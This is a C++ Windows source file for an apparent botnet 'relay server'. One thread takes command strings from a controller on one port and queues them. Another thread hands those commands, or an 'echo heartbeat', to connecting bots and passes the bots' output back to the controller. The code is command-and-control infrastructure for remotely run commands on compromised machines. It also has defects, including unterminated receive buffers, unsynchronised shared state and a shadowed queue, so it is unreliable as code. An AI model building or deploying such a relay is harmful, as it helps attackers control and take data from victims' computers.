#include <winsock2.h> 
#include <ws2tcpip.h> 
#include <iostream>
#include <string>
#include <queue>
#include <mutex>
#include <thread>
#include <conio.h>

#pragma comment(lib, "Ws2_32.lib")

#define INC_PORT 27015
#define INC_IP "127.0.0.1"

#define OUT_PORT 28015
#define OUT_IP "127.0.0.1"

#define LOG 1

std::queue<std::string> cmds;

std::string returnData;

void botConnection() {

	sockaddr_in server;

	server.sin_family = AF_INET;
	server.sin_port = htons(OUT_PORT);
	inet_pton(AF_INET, OUT_IP, &server.sin_addr);

	SOCKET connection = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	bind(connection, (SOCKADDR*)&server, sizeof(server));

	char recvbuf[512];

	while (true) {
		listen(connection, 100);
		SOCKET con = accept(connection, NULL, NULL);

		if (!cmds.empty()) {

			std::string c = cmds.front();
			cmds.pop();

			send(con, c.data(), c.length(), 0);
			#if LOG
			std::cout << "-- SENDING COMMAND --\n\t" << c << "\n-- END COMMAND --\n";
			#endif
		} else {
			send(con, "echo heartbeat", strlen("echo heartbeat"), 0);
			#if LOG
			std::cout << "-- SENDING HEARTBEAT --\n\techo heartbeat\n-- END HEARTBEAT --\n";
			#endif
		}

		while (recv(con, recvbuf, 512, 0) > 0) {
			returnData.append(recvbuf);
			memset(recvbuf, 0, 512);
		}

		closesocket(con);
	}
}
void controlConnection() {
	
	sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(INC_PORT);
	inet_pton(AF_INET, INC_IP, &server.sin_addr);
	
	SOCKET connection = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	char recvbuf[512];

	while (true) {
		int err = connect(connection, (struct sockaddr*)&server, sizeof(server));

		if (err == SOCKET_ERROR) {
			Sleep(100);
			continue;
		}

		if (returnData.length() > 0) {
			send(connection, returnData.data(), returnData.length(), 0);
			returnData.clear();
		}

		std::string cmd;
		while (recv(connection, recvbuf, 512, 0) > 0) {
			cmd.append(recvbuf);
		}

		#if LOG
		std::cout << "-- INCOMING MESSAGE --\n\t" << cmd << "\n-- END MESSAGE --\n";
		#endif

		cmds.push(cmd);
	}
}

int main() {
	std::cout << "Relay Server\n";

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	std::queue<std::string> cmds;

	std::thread botThread(botConnection);
	std::thread controlThread(controlConnection);

	_getch();

	botThread.join();
	controlThread.join();

	WSACleanup();
}